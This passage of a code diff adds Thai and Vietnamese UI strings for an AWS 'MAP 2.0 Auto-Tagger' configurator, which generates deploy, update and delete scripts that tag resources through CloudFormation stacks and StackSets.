+            ui_update_info:'เครื่องมือนี้อัปเกรด MAP Auto-Tagger ที่ deploy อยู่เป็นเวอร์ชันเทมเพลตล่าสุด สร้างสคริปต์ <code>update.sh</code> ที่รักษาการกำหนดค่าขอบเขตและตรวจจับการ deploy แบบบัญชีเดียวและหลายบัญชีโดยอัตโนมัติ',
+            ui_update_step1_title:'รายละเอียดการ deploy',
+            ui_update_step1_subtitle:'กรอก region และขอบเขต (ทางเลือก) สำหรับการอัปเกรด',
+            ui_update_info_detail:'สคริปต์ <code>update.sh</code> ที่สร้างขึ้นจะอ่านเวอร์ชันเทมเพลตปัจจุบันจาก SSM Parameter Store (<code>/auto-map-tagger/&lt;mpe&gt;/version</code>) เปรียบเทียบกับเวอร์ชันเป้าหมาย และปฏิเสธการอัปเกรดข้ามเมเจอร์ (เช่น v19 → v21) โดยไม่มี <code>--force</code> ตาม SemVer การดำเนินการของลูกค้าจำเป็นเฉพาะสำหรับการอัปเกรด MAJOR เท่านั้น',
+            ui_update_scope_title:'อัปเดตเฉพาะ MAP engagement ที่เลือก',
+            ui_update_scope_desc:'หากไม่เลือก จะอัปเดต MAP Auto-Tagger ทุกตัวที่สคริปต์พบในบัญชีนี้ (ทั้ง stack และ stackset ที่ตรงกับ <code>map-auto-tagger-mig*</code>)',
+            ui_update_mpe_label:'MPE ID ที่ต้องการอัปเดต',
+            ui_update_mpe_hint:'— แต่ละ MPE ต้องตรงกับ MAP Auto-Tagger ที่ deploy ใน region นี้',
+            ui_update_add_mpe:'+ เพิ่ม MPE อีก',
+            err_update_mpe:'กรุณากรอก MPE ID 10 ตัวอักษรที่ถูกต้องอย่างน้อยหนึ่งรายการ',
+            ui_update_scope_review:'ขอบเขตการอัปเดต',
+            ui_update_all_review:'MAP Auto-Tagger ทั้งหมดในบัญชีนี้',
+            ui_update_target_version:'เวอร์ชันเทมเพลตเป้าหมาย',
+            ui_update_confirm_text:'ฉันยืนยันว่า MAP Auto-Tagger ที่แสดงมีอยู่ใน region ที่เลือก และการอัปเกรดเป็นเวอร์ชันเทมเพลตเป้าหมายเป็นการดำเนินการที่ตั้งใจ',
+            ui_update_confirm_risk:'การอัปเกรดจะแทนที่โค้ด Lambda, นโยบาย IAM และกฎ EventBridge ในทุก stack ที่ตรงกัน ขอบเขตและวันที่ข้อตกลงจะถูกรักษาผ่าน <code>--use-previous-parameters</code> แต่การ rollout ที่ล้มเหลวอาจทำให้ stack อยู่ในสถานะ UPDATE_ROLLBACK_COMPLETE ซึ่งต้องกู้คืนด้วยตนเอง',
+            err_update_confirm:'คุณต้องยืนยันก่อนที่จะสร้างสคริปต์การอัปเดต',
+            ui_update_step3_subtitle:'รันใน AWS CloudShell จากบัญชีที่ deploy ไว้',
+            ui_mode_delete_title:'ลบการ deploy ที่มีอยู่',
+            ui_mode_delete_desc:'ลบการ deploy MAP Auto-Tagger ออกจากบัญชี โดยค่าเริ่มต้นจะลบทุก stack และ stackset ของ map-auto-tagger-mig* ใน region; สามารถจำกัดเฉพาะ MPE ที่ต้องการได้ แท็ก map-migrated จะไม่ถูกลบออกจากทรัพยากรที่ติดแท็กไว้แล้ว',
+            ui_dstep1:'1. กำหนดค่า',
+            ui_dstep2:'2. ตรวจสอบ',
+            ui_dstep3:'3. ดาวน์โหลด',
+            ui_delete_info:'เครื่องมือนี้ลบการ deploy MAP Auto-Tagger ออกจากบัญชีของคุณ สร้างสคริปต์ delete.sh ที่ตรวจจับ stack บัญชีเดียวและ StackSet หลายบัญชีโดยอัตโนมัติ โดยค่าเริ่มต้น การ deploy map-auto-tagger-mig* ทุกรายการใน region ที่เลือกจะถูกลบ แท็ก map-migrated จะไม่ถูกลบออกจากทรัพยากรที่ติดแท็กแล้ว — แท็กเหล่านั้นยังคงอยู่เพื่อให้เครดิต MAP ยังคงครบถ้วน',
+            ui_delete_step1_title:'รายละเอียดการ deploy',
+            ui_delete_step1_subtitle:'เลือก region ที่จะลบ',
+            ui_delete_scope_title:'จำกัดเฉพาะการเข้าร่วม MAP (MPE) ที่กำหนด',
+            ui_delete_scope_desc:'หากไม่ติ๊ก จะลบการ deploy MAP Auto-Tagger ทั้งหมดที่พบใน region นี้ (ทั้ง stack และ stackset ที่ตรงกับ map-auto-tagger-mig*)',
+            ui_delete_scope_all:'การ deploy map-auto-tagger-mig* ทั้งหมดใน region นี้',
+            ui_delete_scope_specific:'MPE ที่กำหนด',
+            ui_delete_mpe_label:'MPE ID ที่จะลบ',
+            ui_delete_mpe_hint:'— แต่ละรายการต้องตรงกับ MAP Auto-Tagger ที่ deploy ไว้ใน region นี้',
+            ui_delete_add_mpe:'+ เพิ่ม MPE อีก',
+            err_delete_mpe:'MAP Engagement ID ต้องเป็นตัวอักษรอังกฤษตัวพิมพ์ใหญ่ (A–Z) และตัวเลข (0–9) จำนวน 10 อักขระพอดี โดยต้องมีตัวอักษรและตัวเลขอย่างน้อยอย่างละหนึ่งตัว',
+            ui_delete_optin_title:'ตัวเลือกเสริม — CloudWatch Log Groups',
+            ui_delete_optin_logs:'ลบ CloudWatch Log Groups',
+            ui_delete_optin_logs_hint:'— จะลบประวัติการตรวจสอบ โดยค่าเริ่มต้นจะเก็บล็อกไว้',
+            ui_delete_optin_bucket:'S3 staging bucket',
+            ui_delete_bucket_conditional:'ลบเฉพาะเมื่อไม่มีการ deploy อื่นเหลืออยู่',
+            ui_delete_bucket_yes:'ใช่ — จะไม่มีการ deploy ใดเหลืออยู่',
+            ui_delete_bucket_note:'S3 staging bucket จะถูกจัดการโดยอัตโนมัติ: จะถูกลบก็ต่อเมื่อไม่มีการ deploy MAP Auto-Tagger อื่นเหลืออยู่ในบัญชี',
+            ui_delete_review_subtitle:'ยืนยันสิ่งที่จะถูกลบ',
+            ui_delete_confirm_title:'⚠️ พิมพ์ DELETE เพื่อยืนยัน',
+            ui_delete_confirm_hint:'การกระทำนี้จะลบทรัพยากร CloudFormation แท็ก map-migrated ที่มีอยู่บนทรัพยากร AWS จะถูกเก็บรักษาไว้ แต่ Lambda จะหยุดติดแท็กทรัพยากรใหม่ทันที',
+            ui_delete_confirm_label:'พิมพ์คำว่า DELETE เพื่อยืนยัน',
+            err_delete_confirm:'พิมพ์คำว่า "DELETE" เพื่อดำเนินการต่อ',
+            ui_delete_generate:'สร้าง delete.sh →',
+            ui_delete_download:'⬇ ดาวน์โหลด delete.sh',
+            ui_delete_step3_subtitle:'รันใน AWS CloudShell จากบัญชีที่ deploy ไว้',
+            d_instr_title:'คำแนะนำการลบ — MAP Auto-Tagger',
+            d_instr_region_label:'Region:',
+            d_instr_scope_label:'ขอบเขต:',
+            d_instr_version_label:'เวอร์ชันเทมเพลต:',
+            d_instr_scope_specific:'MPE —',
+            d_instr_scope_all:'การ deploy MAP Auto-Tagger ทั้งหมดใน region นี้',
+            d_instr_opt1:'ตัวเลือกที่ 1: AWS CloudShell (แนะนำ)',
+            d_instr_opt1_step1:'1. เข้าสู่ระบบ AWS Console สำหรับบัญชีที่ทำการ deploy\n   (สำหรับการ deploy หลายบัญชี นี่คือบัญชีผู้จัดการ)',
+            d_instr_opt1_step2:'2. เปิด CloudShell',
+            d_instr_opt1_step3:'3. อัปโหลด delete.sh และรัน:',
+            d_instr_opt2:'ตัวเลือกที่ 2: AWS CLI ภายในเครื่อง',
+            d_instr_opt2_step1:'1. ตรวจสอบว่าติดตั้ง AWS CLI v2 และตั้งค่าด้วยข้อมูลประจำตัวผู้ดูแลระบบ',
+            d_instr_opt2_step2:'2. รัน: bash delete.sh',
+            d_instr_what_title:'สคริปต์ทำอะไร:',
+            d_instr_what_scoped:'ค้นหา Stack หรือ StackSet ของ MPE แต่ละรายการที่ระบุและลบทิ้ง',
+            d_instr_what_all:'แจกแจงทุก Stack และ StackSet ของ map-auto-tagger-mig* ใน region และลบทิ้ง',
+            d_instr_what_stackset:'สำหรับ StackSet: ลบ stack instance แบบขนาน (ทนทาน 100%) จากนั้นลบ StackSet',
+            d_instr_what_stack:'สำหรับ Stack: รัน delete-stack และรอจนเสร็จสิ้น',
+            d_instr_what_bucket:'ลบ S3 staging bucket เฉพาะเมื่อไม่มีการ deploy MAP Auto-Tagger เหลืออยู่ใน region มิฉะนั้นจะเก็บไว้เพื่อไม่ให้กระทบการ deploy อื่น',
+            d_instr_logs_delete:'ลบ CloudWatch Log Groups ที่ตรงกัน',
+            d_instr_logs_preserve:'CloudWatch Log Groups (เก็บประวัติการตรวจสอบไว้)',
+            d_instr_preserved_title:'เก็บรักษาไว้ (ไม่เคยถูกลบ):',
+            d_instr_preserved_tags:'แท็ก map-migrated บนทรัพยากร AWS (เครดิต MAP ยังคงครบถ้วน)',
+            d_instr_preserved_iam:'IAM role สำหรับผู้ดูแลและรัน StackSet (โครงสร้างองค์กรร่วม)',
+            d_instr_idempotent:'Idempotent: รันซ้ำได้อย่างปลอดภัย ทรัพยากรที่หายไปจะรายงานว่าถูกข้าม ไม่ใช่ล้มเหลว',
+            ui_version_history_title:'ประวัติเวอร์ชัน — มีอะไรเปลี่ยนแปลง?',
+            ui_version_released:'เผยแพร่',
+            ui_version_current:'เป้าหมายปัจจุบัน',
+            ui_version_full_changelog:'ดูบันทึกการเปลี่ยนแปลงทั้งหมดบน GitHub',
+            ui_version_tag_bugfix:'แก้ไขบั๊ก',
+            ui_version_tag_coverage:'ครอบคลุมใหม่',
+            ui_version_tag_breaking:'เปลี่ยนแปลงสำคัญ',
+            ui_version_tag_security:'ความปลอดภัย',
+            ui_version_tag_perf:'ประสิทธิภาพ',
+            ui_version_tag_other:'อื่น ๆ',
+            ui_editor_back:'← กลับ',
+            ui_editor_review:'ตรวจสอบ →',
+            ui_editor_review_title:'ตรวจสอบการตั้งค่า',
+            ui_editor_review_subtitle:'ตรวจสอบการตั้งค่าของคุณก่อนสร้างสคริปต์อัปเดต',
+            ui_editor_review_accounts:'บัญชี',
+            ui_editor_confirm_text:'ฉันยืนยันว่า MAP Auto-Tagger ถูก deploy แล้วในภูมิภาคที่เลือกโดยใช้ MPE ID ที่ระบุ และทั้งสองค่าถูกต้อง',
+            ui_editor_confirm_risk:'การสร้างและรันสคริปต์นี้ด้วยข้อมูลที่ไม่ถูกต้องอาจอัปเดต StackSet ที่ผิด ทำให้ขอบเขตบัญชีเสียหาย หรือทำให้ทรัพยากรถูกติด tag ด้วย MAP engagement ID ที่ผิด — เครดิต MAP ที่สูญหายไม่สามารถกู้คืนได้',
+            err_editor_confirm:'คุณต้องยืนยันก่อนสร้างสคริปต์อัปเดต',
+            ui_editor_generate:'สร้าง update.sh →',
+            ui_editor_step3_title:'สคริปต์พร้อมแล้ว',
+            ui_editor_step3_subtitle:'รันในAWS CloudShell จาก management account',
+            ui_editor_download:'⬇ ดาวน์โหลด update.sh',
+            ui_editor_script_preview:'ตัวอย่างสคริปต์',
+            err_date_required:'กรุณากรอกวันที่เริ่มต้นข้อตกลง',
+            err_date_end:'วันที่สิ้นสุดต้องอยู่หลังวันที่เริ่มต้น',
+            err_vpc_required:'กรุณากรอก VPC ID อย่างน้อยหนึ่งรายการ',
+            err_vpc_format:'รูปแบบ VPC ID ไม่ถูกต้อง ต้องขึ้นต้นด้วย vpc- ตามด้วยอักขระฐานสิบหก 8-17 ตัว (เช่น vpc-0abc1234def56789)',
+            err_duplicate_vpc:'พบ VPC ID ซ้ำ กรุณาลบรายการที่ซ้ำออก',
+            err_central_account_required:'กรุณากรอก ID บัญชีกลาง (12 หลัก)',
+            d_title:'การตั้งค่า MAP 2.0 Auto-Tagger',
+            d_tag_label:'ค่า Tag', d_region_label:'Region', d_account_label:'บัญชี',
+            d_step1:'ขั้นตอนที่ 1/3: กำลังตรวจสอบบัญชีของคุณ...',
+            d_step2:'ขั้นตอนที่ 2/3: กำลังติดตั้งระบบ Auto-Tagger...',
+            d_step2_wait:'(โดยทั่วไปใช้เวลา 1-2 นาที)',
+            d_step2_wait_multi:'(โดยทั่วไปใช้เวลา 10-15 นาที)',
+            d_step3:'ขั้นตอนที่ 3/3: กำลังบันทึกรายงานการติดตั้ง...',
+            d_ok_creds:'เชื่อมต่อกับบัญชี AWS สำเร็จแล้ว',
+            d_fail_creds:'ไม่สามารถเชื่อมต่อกับบัญชี AWS ของคุณได้',
+            d_fix_creds:'เซสชันของคุณอาจหมดอายุ โปรดปิดและเปิด AWS CloudShell ใหม่ แล้วรันสคริปต์อีกครั้ง',
+            d_ok_trail:'การบันทึกกิจกรรมเปิดใช้งานแล้วใน Region:',
+            d_fail_trail:'การบันทึกกิจกรรม (CloudTrail) ยังไม่เปิดใช้งานใน Region:',
+            d_fix_trail1:'ไปที่ AWS Console → CloudTrail → สร้าง Trail',
+            d_fix_trail2:'ต้องรวม Region:',
+            d_ok_perms:'สิทธิ์การติดตั้งพร้อมใช้งานแล้ว',
+            d_fail_perms:'บัญชีของคุณไม่มีสิทธิ์การติดตั้งที่จำเป็น',
+            d_fix_perms:'ขอให้ผู้ดูแลระบบ AWS ของคุณให้สิทธิ์ AWS CloudFormation, IAM, AWS Lambda, Amazon EventBridge, AWS Systems Manager, Amazon SNS, Amazon SQS และ Amazon CloudWatch',
+            d_ok_org:'กำลังทำงานจากบัญชีที่ถูกต้อง (บัญชีการจัดการหรือผู้ดูแลระบบที่ได้รับมอบหมาย)',
+            d_ok_org_delegated:'กำลังทำงานในฐานะผู้ดูแลระบบที่ได้รับมอบหมายสำหรับ CloudFormation StackSets',
+            d_fail_org:'สคริปต์นี้ต้องรันจากบัญชีการจัดการขององค์กรหรือบัญชีผู้ดูแลระบบที่ได้รับมอบหมายสำหรับ CloudFormation StackSets',
+            d_fix_org:'เปลี่ยนไปใช้บัญชีการจัดการ (หรือบัญชีผู้ดูแลที่ได้รับมอบหมาย) ใน AWS CloudShell แล้วรันสคริปต์อีกครั้ง หากไม่แน่ใจว่าเป็นบัญชีใด โปรดติดต่อทีมบัญชี AWS ของคุณ',
+            d_warn_stacksets:'การผสานการติดตั้งแบบหลายบัญชียังไม่เปิดใช้งาน — จะถูกตั้งค่าอัตโนมัติระหว่างการติดตั้ง',
+            d_ok_stacksets:'การผสานการติดตั้งแบบหลายบัญชีเปิดใช้งานแล้ว',
+            d_ok_scp:'ไม่มีนโยบายความปลอดภัยที่บล็อกบริการ Tag',
+            d_ok_vpc:'พบ VPC ในบัญชีนี้:',
+            d_fail_vpc:'ไม่พบ VPC ในบัญชี/Region นี้:',
+            d_fix_vpc:'ตรวจสอบว่า VPC ID ถูกต้องและมีอยู่ในบัญชีและ Region เป้าหมาย',
+            d_ok_account_scope:'พบบัญชีในองค์กร:',
+            d_fail_account_scope:'ไม่พบบัญชีในองค์กร:',
+            d_fix_account_scope:'ตรวจสอบว่า Account ID เป็นบัญชี 12 หลักที่ถูกต้องและเป็นสมาชิกขององค์กร AWS ของคุณ',
+            d_fail_scp:'นโยบายความปลอดภัยในองค์กรของคุณกำลังบล็อกบริการ Tag',
+            d_fix_scp:"ติดต่อทีมความปลอดภัย AWS ของคุณเพื่อขออนุญาตให้ใช้ 'tag:TagResources' สำหรับ Lambda execution role",
+            d_scp_note:"(หมายเหตุ: หากองค์กรของคุณกำหนดให้ต้องมี Tag ตั้งแต่ตอนสร้าง Resource โปรดขอให้ทีมความปลอดภัยยกเว้น Tag key 'map-migrated')",
+            d_all_passed:'การตรวจสอบทั้งหมดผ่านแล้ว',
+            d_checks_failed:'การตรวจสอบล้มเหลว โปรดทำตามขั้นตอนด้านบน แล้วรันสคริปต์อีกครั้ง',
+            d_fix_label:'→ วิธีแก้ไข:',
+            d_deploying:'กำลังติดตั้ง คุณกด Ctrl+C ได้อย่างปลอดภัย — การติดตั้งจะดำเนินต่อในพื้นหลัง',
+            d_still_deploying:'ยังคงตั้งค่าอยู่...',
+            d_elapsed:'ที่ผ่านไป',
+            d_deploy_failed:'การตั้งค่าล้มเหลว โปรดแชร์รายงานด้านล่างนี้กับทีม AWS Account ของคุณ',
+            d_complete_title:'ติดตั้งสำเร็จ!',
+            d_complete_single:'ทรัพยากรใหม่จะได้รับ Tag โดยอัตโนมัติภายใน 1-2 นาทีหลังสร้าง (สูงสุด 15 นาทีในช่วงที่มีการใช้งานสูง)',
+            d_complete_multi:'การติด Tag อัตโนมัติเปิดใช้งานแล้วในทุกบัญชีขององค์กรของคุณ',
+            d_backfill_msg:'การเติม Tag ย้อนหลังจะเริ่มในไม่ช้า',
+            d_backfill_waiting:'กำลังรอการเติม Tag ย้อนหลังเสร็จสิ้น...',
+            d_backfill_wait_info:'(การเติม Tag ย้อนหลังจะเริ่มในไม่ช้า อาจใช้เวลาสูงสุด 15 นาที)',
+            d_backfill_starting:'การเติม Tag ย้อนหลังกำลังทำงาน...',
+            d_backfill_in_progress:'กำลังเติม Tag ย้อนหลัง...',
+            d_backfill_timeout:'การเติม Tag ย้อนหลังยังคงทำงานอยู่ บันทึกรายงานแล้ว — ตรวจสอบผลลัพธ์สุดท้ายใน CloudWatch:  aws logs tail /aws/lambda/map-auto-tagger-backfill',
+            d_backfill_done:'เติม Tag ย้อนหลังเสร็จสิ้น',
+            r_backfill_result:'ผลการเติม Tag ย้อนหลัง',
+            d_backfill_since:'จะติด Tag ให้ทรัพยากรที่สร้างตั้งแต่:',
+            d_report_saved:'บันทึกรายงานการติดตั้งที่:',
+            d_share_report:'แชร์ไฟล์นี้กับทีม AWS Account ของคุณ',
+            r_title:'MAP 2.0 Auto-Tagger — รายงานการติดตั้ง',
+            r_customer:'ลูกค้า', r_mpe:'MPE ID', r_region:'Region', r_account:'บัญชี',
+            r_date:'วันที่ / เวลา', r_result:'ผลลัพธ์',
+            r_preflight:'ผลการตรวจสอบเบื้องต้น:',
+            r_deployed:'สิ่งที่ติดตั้งแล้ว:',
+            r_verify:'วิธีการตรวจสอบ:',
+            r_backfill:'สถานะการเติม Tag ย้อนหลัง:',
+            r_perstatus:'สถานะแต่ละบัญชี:',
+            r_support:'การสนับสนุน:',
+            r_action:'การดำเนินการที่จำเป็น:',
+            r_verify1:'1. สร้างทรัพยากรใดก็ได้ในบัญชี AWS ของคุณ',
+            r_verify2:'2. รอ 1-2 นาที (สูงสุด 15 นาทีในช่วงที่มีการใช้งานสูง)',
+            r_verify3:'3. ตรวจสอบว่าทรัพยากรมี Tag: map-migrated =',
+            r_share_help:'แชร์รายงานนี้กับทีม AWS Account ของคุณหากต้องการความช่วยเหลือ',
+            r_contact:'ติดต่อทีม AWS Account ของคุณหากต้องการความช่วยเหลือ',
+            r_action_desc:'โปรดแก้ไขการตรวจสอบที่ล้มเหลวข้างต้น แล้วรัน deploy.sh อีกครั้ง'
+          },
+          vi: {
+            ui_title:'MAP 2.0 Auto-Tagger Configurator',
+            ui_btn_download:'Tải xuống',
+                        ui_instr_opt1_title:'Tùy chọn 1: AWS CloudShell (Khuyến nghị)',
+            ui_instr_opt2_title:'Tùy chọn 2: AWS CLI cục bộ',
+            ui_instr_cli_prereq_single:'Đảm bảo AWS CLI v2 đã được cài đặt và cấu hình với thông tin xác thực tài khoản di chuyển.',
+            ui_instr_cli_prereq_multi:'Đảm bảo AWS CLI v2 đã được cài đặt và cấu hình với thông tin xác thực tài khoản quản lý.',
+            ui_instr_cli_download:'Tải deploy.sh xuống máy tính của bạn.',
+            ui_instr_cli_download_all:'Tải tất cả 3 file xuống máy tính của bạn.',
+            ui_instr_cli_terminal:'Mở terminal (Linux/macOS) hoặc WSL/Git Bash (Windows)',
+            ui_cli_alt_short:'Cấu hình AWS CLI cho tài khoản đó và chạy:',
+            ui_instr_single_title:'HƯỚNG DẪN TRIỂN KHAI — Một tài khoản',
+ui_instr_single_title:'HƯỚNG DẪN TRIỂN KHAI — Một tài khoản',
+            ui_instr_multi_title:'HƯỚNG DẪN TRIỂN KHAI — Nhiều tài khoản',
+            ui_instr_login_single:'Đăng nhập vào AWS Console cho tài khoản di chuyển của bạn.',
+            ui_instr_login_multi:'Đăng nhập vào AWS Console cho tài khoản QUẢN LÝ của bạn.',
+            ui_instr_open_cloudshell:'Mở CloudShell (nhấp vào biểu tượng terminal trên thanh menu).',
+            ui_instr_upload_files:'Tải file lên (CloudShell → Actions → Upload file):',
+            ui_instr_upload_all:'Tải lên tất cả 3 file (CloudShell → Actions → Upload file):',
+            ui_instr_run:'Chạy:',
+            ui_instr_done_single:'Xong. Script sẽ triển khai và xác nhận khi hoàn tất.',
+            ui_instr_done_multi:'Xong. Tính năng tự động gắn tag đã hoạt động trên tất cả tài khoản.',
+            ui_instr_verify_title:'Xác minh tính năng gắn tag hoạt động (sau triển khai):',
+            ui_instr_expected:'Kết quả mong đợi',
+            ui_instr_thats_it:'Vậy là xong. Tính năng tự động gắn tag đã hoạt động cho 140+ loại resource được hỗ trợ.',
+            ui_instr_existing_only:'Resource hiện có KHÔNG bị ảnh hưởng — chỉ áp dụng cho resource mới tạo.',
+            ui_instr_auto_handles:'Script xử lý mọi thứ tự động:',
+            ui_instr_uploads_s3:'Tải template lên S3',
+            ui_instr_enables_stacksets:'Kích hoạt StackSets trong tổ chức',
+            ui_instr_discovers_org:'Tự động phát hiện cấu trúc org',
+            ui_instr_deploys_all:'Triển khai đến tất cả tài khoản (~10 phút)',
+            ui_instr_check_status:'Kiểm tra trạng thái sau khi chạy',
+            ui_instr_files_received:'Bạn nhận được 3 file',
+            ui_instr_target_accounts:'Tài khoản mục tiêu',
+            ui_instr_all_accounts:'(chưa chỉ định tài khoản)',
+            ui_instr_all_org:'tất cả tài khoản trong org',
+            ui_instr_cloudtrail_note:'LƯU Ý: CloudTrail phải được bật trong mỗi tài khoản và region mục tiêu.',
+            ui_sample_notice_title:'Lưu ý về Mã mẫu:',
+            ui_sample_notice_body:"Đây là mã mẫu cho mục đích phi sản xuất. Bạn có trách nhiệm kiểm tra, bảo mật và tối ưu hóa giải pháp này để đáp ứng các yêu cầu bảo mật, pháp lý và tuân thủ của tổ chức trước khi triển khai. Việc triển khai giải pháp này có thể phát sinh phí AWS cho AWS Lambda, Amazon EventBridge, Amazon CloudWatch, Amazon SNS, Amazon SQS và AWS Systems Manager. Xem:",
+            ui_shared_responsibility:'Mô hình Trách nhiệm Chung AWS',
+            ui_btn_copy:'Sao chép Hướng dẫn',
+            ui_one_file_step:'Một file. Một bước.',
+            ui_send_script:'Gửi',
+            ui_to_customer:'cho khách hàng.',
+            ui_cloudshell_open:'Họ mở',
+            ui_in_account:'trong',
+            ui_upload_and_run:'AWS CloudShell, tải file lên và chạy:',
+            ui_mgmt_account:'tài khoản quản lý',
+            ui_migration_account_label:'tài khoản di chuyển',
+            d_log_pass:'THÀNH CÔNG:',
+            d_log_fail:'THẤT BẠI:',
+            d_log_warn:'CẢNH BÁO:',
+            ui_main_desc1:'Tạo template CloudFormation tự động gắn tag',
+            ui_main_desc2:'cho resource AWS mới trong vòng',
+            ui_main_desc3:'60–90 giây (tối đa 15 phút khi tải cao)',
+            ui_main_desc4:'sau khi tạo.',
+            ui_main_desc5:'Bao gồm',
+            ui_main_desc6:'loại resource trên tất cả dịch vụ AWS chính (đã kiểm thử E2E trên CT org).',
+            ui_main_desc7:'Chi phí khách hàng:',
+            ui_step1:'1. Cấu hình', ui_step2:'2. Xem xét', ui_step3:'3. Tải xuống',
+            ui_card_deal_title:'Thông tin thỏa thuận MAP 2.0',
+            ui_card_deal_subtitle:'Nhập thông tin thỏa thuận MAP từ AWS Investments',
+            ui_customer_name:'Tên khách hàng', ui_customer_name_hint:'(chỉ dùng để tạo tên file)',
+            ui_customer_name_placeholder:'Ví dụ: Công ty ABC',
+            ui_mpe_tag:'MAP Engagement ID',
+            ui_mpe_hint:'(Mã 10 ký tự chữ và số từ AWS Investments — ví dụ: A1B2C3D4E5)',
+            ui_agree_start:'Ngày bắt đầu thỏa thuận', ui_agree_start_hint:'(Ngày bắt đầu gắn tag cho resource MAP 2.0)',
+            ui_agree_end:'Ngày kết thúc thỏa thuận', ui_agree_end_hint:'(Ngày dừng gắn tag cho resource mới)',
+            ui_alert_email:'Email cảnh báo', ui_alert_email_hint:'(tùy chọn — email nhận thông báo lỗi tag)',
+            ui_alert_email_missing_warn:'⚠️ Không có email cảnh báo được thiết lập. Lỗi gắn tag (IAM từ chối, hạn mức tag, service drift) sẽ bị âm thầm loại bỏ — không có SNS, không có đích đến của DLQ alarm. Bạn có thể thêm người đăng ký sau qua scripts/add_subscriber.sh hoặc chạy lại configurator.\n\nTiếp tục mà không có người đăng ký cảnh báo?',
+            ui_email_confirm_hint:'Khách hàng phải xác nhận email đăng ký AWS sau khi triển khai.',
+            ui_deploy_mode:'Chế độ triển khai', ui_deploy_mode_subtitle:'Chọn số lượng tài khoản AWS dùng cho quá trình di chuyển',
+            ui_single_title:'Một tài khoản', ui_single_desc:'Triển khai vào một tài khoản AWS. Hoàn thành trong 2 phút.',
+            ui_multi_title:'Nhiều tài khoản (AWS Organizations)', ui_multi_desc:'Triển khai đồng thời vào tất cả tài khoản trong AWS Organization qua StackSet.',
+            ui_backfill_title:'Backfill một lần', ui_optional:'(tùy chọn)',
+            ui_coverage_title:'Những gì sẽ được gắn Tag',
+            ui_btn_next:'Tiếp theo: Xem xét →', ui_btn_back:'← Quay lại', ui_btn_generate:'Tạo và Tải xuống →',
+            ui_tagging_scope:'Phạm vi gắn Tag', ui_vpc_scope_hint:'Theo mặc định, tất cả resource mới trong tài khoản đều được gắn tag. Sử dụng phạm vi VPC nếu workload di chuyển và workload khác dùng chung tài khoản.',
+            ui_vpc_limit:'Giới hạn gắn tag chỉ cho các VPC cụ thể',
+            ui_tag_non_vpc:'Cũng gắn tag cho resource không thuộc VPC (S3, DynamoDB, Lambda, SNS, SQS, v.v.)',
+            ui_tag_non_vpc_hint:'Các dịch vụ này không có liên kết VPC. Nên gắn tag tất cả bất kể phạm vi VPC để đảm bảo đủ điều kiện MAP.',
+            ui_vpc_ids:'VPC ID', ui_vpc_ids_hint:'(chỉ resource liên kết VPC trong các VPC này sẽ được gắn tag)',
+            ui_add_vpc:'+ Thêm VPC', ui_add_account:'+ Thêm tài khoản', ui_add_region:'+ Thêm region',
+            ui_migration_account_ids:'ID tài khoản di chuyển', ui_migration_account_ids_hint:'(để tham khảo — stack sẽ tự động triển khai đến toàn bộ org)',
+            ui_stackset_note:'Lambda được triển khai đến mọi tài khoản trong org qua root OU. Mặc định, resource của tất cả tài khoản đều được gắn tag. Bạn có thể giới hạn việc gắn tag chỉ cho các tài khoản cụ thể.',
+            ui_stackset_bucket_note:'Quá trình triển khai này tạo một S3 bucket tạm thời (auto-map-tagger-{account-id}) để lưu trữ template CloudFormation cho StackSet. Bucket được giữ lại sau khi triển khai vì StackSet cần nó để triển khai đến các tài khoản mới tham gia tổ chức trong tương lai.',
+            ui_account_limit:'Giới hạn gắn tag chỉ cho các tài khoản cụ thể',
+            err_account_scope_required:'Vui lòng nhập ít nhất một ID tài khoản.',
+            err_account_format:'ID tài khoản không hợp lệ. Phải có chính xác 12 chữ số.',
+            err_duplicate_account:'Phát hiện ID tài khoản trùng lặp. Vui lòng xóa các mục trùng.',
+            ui_central_account_id:'ID tài khoản trung tâm', ui_central_account_id_hint:'(tài khoản nơi Lambda sẽ được triển khai)',
+            ui_member_accounts:'Tài khoản thành viên trong phạm vi MAP',
+            ui_deployment_regions:'Region triển khai', ui_deployment_regions_hint:'(region nơi khách hàng tạo resource)',
+            ui_backfill_strong:'Gắn tag cho resource hiện có được tạo từ ngày bắt đầu thỏa thuận',
+            ui_backfill_scope_note:'✓ Đã áp dụng phạm vi: backfill sẽ tuân theo cài đặt phạm vi VPC/tài khoản đã chọn ở trên.',
+            ui_backfill_desc:'Triển khai Lambda một lần để truy vấn lịch sử CloudTrail từ ngày bắt đầu thỏa thuận và gắn tag cho tất cả resource được tạo trước khi giải pháp này được triển khai. Tự động chạy khoảng 5 phút sau khi triển khai.',
+            ui_backfill_note:'Lưu ý: Lịch sử CloudTrail giới hạn trong 90 ngày gần nhất. Resource được tạo trước khoảng thời gian đó cần gắn tag thủ công.',
+            ui_coverage_subtitle:'140+ loại resource đã được xác minh qua kiểm thử CT org đa tài khoản (4 tài khoản × 4 region)',
+            ui_review_title:'Xem xét cấu hình', ui_review_subtitle:'Xác minh cài đặt trước khi tạo template',
+            ui_what_deployed:'Những gì sẽ được triển khai',
+            ui_template_ready:'Template đã sẵn sàng', ui_template_ready_subtitle:'Chia sẻ cùng với hướng dẫn triển khai bên dưới cho khách hàng',
+            ui_prereq_title:'Điều kiện tiên quyết của khách hàng', ui_prereq_subtitle:'deploy.sh được tạo sẽ tự động xác minh trước khi triển khai:',
+            ui_prereq_cloudtrail:'CloudTrail phải được bật trong region đích',
+            ui_prereq_perms:'Người triển khai phải có quyền AWS CloudFormation (IAM, AWS Lambda, Amazon EventBridge, AWS Systems Manager, Amazon SNS, Amazon SQS, Amazon CloudWatch)',
+            ui_prereq_org:'Tài khoản quản lý phải bật AWS Organizations và trusted access CloudFormation StackSets',
+            ui_scp_title:'⚠️ Lưu ý về Chính sách kiểm soát dịch vụ (SCP)',
+            ui_scp_intro:'Nếu tổ chức của khách hàng sử dụng SCP, hãy xác minh những điều sau trước khi triển khai:',
+            ui_deploy_instructions:'Hướng dẫn triển khai cho khách hàng',
+            ui_template_preview:'Xem trước template', ui_download_template:'Tải xuống CloudFormation Template', ui_download_template_note:'Tùy chọn — dành cho khách hàng muốn xem lại mã CloudFormation trước khi triển khai.', ui_start_over:'Bắt đầu lại',
+            ui_cost_note:'Chi phí hàng tháng ước tính: ', ui_cost_note2:' / tài khoản (lời gọi Lambda + CloudWatch). Không cần AWS Config.',
